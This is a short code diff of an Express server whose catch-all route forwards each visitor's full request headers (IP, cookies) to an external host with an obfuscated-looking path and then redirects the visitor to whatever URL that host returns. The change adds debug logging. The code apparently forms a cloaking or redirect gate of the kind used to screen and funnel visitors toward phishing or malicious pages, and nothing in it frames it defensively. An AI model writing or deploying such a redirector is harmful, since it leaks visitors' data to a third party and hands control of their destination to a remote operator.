@@ -12,6 +12,8 @@ app.get("*", function (req, res) {
   req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
   var head = req.headers;
   var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("content-length","content2").replace("accept-encoding","dfsdfsdff")
+  console.log(headerss)
+  console.log(req.url)
   var querystring = req.url;
   var urrrl = "https://entermeet.online/bMowEtfWDS/PjYOuZqfBr/&MVTSWDyTjuISHLrPrKJ&YTtt=doQeAidpiupEXs&FAHQeepST";
   
@@ -21,7 +23,7 @@ app.get("*", function (req, res) {
         headers:JSON.parse(headerss),
         url:     urrrl,
       }, function(error, response, body){
-       
+            console.log(body)
             return res.redirect(body); 
 
     });
